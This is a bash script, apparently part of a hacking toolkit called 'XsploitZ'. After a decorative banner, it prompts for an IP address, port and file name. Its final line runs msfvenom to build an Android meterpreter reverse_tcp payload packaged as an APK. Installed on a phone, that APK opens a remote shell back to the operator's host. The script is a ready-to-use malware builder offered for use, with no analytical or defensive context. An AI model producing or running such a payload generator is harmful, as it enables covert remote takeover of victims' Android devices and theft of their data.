#!/bin/bash 
clear
echo -e $yellow""
echo " =========================================================================="
echo " "
echo -e $okegreen" 𝙓𝙨𝙥𝙡𝙤𝙞𝙩𝙕 𝙋𝙖𝙮𝙡𝙤𝙖𝙙_𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙤𝙧 𝙊𝙛𝙛𝙞𝙘𝙖𝙡𝙮 𝘾𝙤𝙙𝙚𝙙 𝘽𝙮 𝙋𝙧𝙞𝙣𝙘𝙚 𝙆𝙖𝙪𝙨𝙝𝙞𝙠 "
echo
echo -e $yellow"   / _ \___ _    _____ ____/ _/_ __/ / / "
echo "  / ___/ _ \ |/|/ / -_) __/ _/ // / / /  "
echo " /_/   \___/__,__/\__/_/ /_/ \_,_/_/_/    "
echo " "
echo""
echo -e $okegreen"    Thankyou For Using 𝙓𝙨𝙥𝙡𝙤𝙞𝙩𝙕   💜 "
echo "                   🇮🇳 Keep supporting, Keep learning 🇮🇳 "
echo "  "
echo -e $yellow" =========================================================================="
echo -e $okegreen""
echo -ne "Press Any Key To Continue => "; read prince
clear
echo -ne "Enter Your Ip => "; read ip
echo -ne "Enter Your Port => "; read port
echo -ne "Enter Your APK Name => "; read name
echo "Please Wait..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > $name.apk